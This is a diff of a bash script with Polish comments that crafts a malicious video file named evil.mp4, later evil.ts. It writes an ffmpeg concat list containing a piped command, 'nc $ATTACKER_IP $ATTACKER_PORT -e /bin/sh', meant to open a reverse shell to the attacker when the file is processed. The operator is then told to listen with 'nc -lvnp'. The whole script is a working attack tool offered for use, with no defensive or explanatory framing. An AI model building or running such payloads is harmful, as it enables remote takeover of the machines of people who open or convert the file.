@@ -1,28 +1,32 @@
 #!/bin/bash
 
-# === KONFIGURACJA ===
-ATTACKER_IP="192.168.1.100"     # ← Twój IP
-ATTACKER_PORT="4444"            # ← Port do nasłuchu
+# Konfiguracja
+ATTACKER_IP="192.168.1.100"
+ATTACKER_PORT="4444"
 
-# === SPRAWDZENIE PLIKU BAZOWEGO ===
+# Sprawdź plik źródłowy
 if [ ! -f "legit.mp4" ]; then
-  echo "[!] Brakuje pliku 'legit.mp4'. Dodaj krótki plik wideo jako bazę!"
+  echo "[!] Brakuje pliku 'legit.mp4'"
   exit 1
 fi
 
-# === PLIK LISTY ===
+# Konwersja legitnego pliku do .ts
+echo "[*] Konwertowanie legit.mp4 -> legit.ts..."
+ffmpeg -i legit.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts legit.ts
+
+# Tworzenie listy
 echo "[*] Tworzenie list.txt..."
-echo "file 'legit.mp4'" > list.txt
+echo "file 'legit.ts'" > list.txt
 echo "file '|/bin/bash -c \"nc $ATTACKER_IP $ATTACKER_PORT -e /bin/sh\"'" >> list.txt
 
-# === GENEROWANIE MP4 ===
-echo "[*] Generowanie złośliwego evil.mp4..."
-ffmpeg -f concat -safe 0 -i list.txt -c copy evil.mp4
+# Łączenie
+echo "[*] Generowanie evil.ts..."
+ffmpeg -f concat -safe 0 -i list.txt -c copy evil.ts
 
-# === PODSUMOWANIE ===
-if [[ -f "evil.mp4" ]]; then
-    echo "[+] Gotowe! Plik 'evil.mp4' utworzony."
-    echo "[!] Nasłuchuj połączenia: nc -lvnp $ATTACKER_PORT"
+# Podsumowanie
+if [[ -f "evil.ts" ]]; then
+  echo "[+] Gotowe! Plik 'evil.ts' utworzony."
+  echo "[!] Nasłuchuj połączenia: nc -lvnp $ATTACKER_PORT"
 else
-    echo "[!] Coś poszło nie tak – nie utworzono pliku evil.mp4."
+  echo "[!] Coś poszło nie tak – nie utworzono pliku evil.ts."
 fi
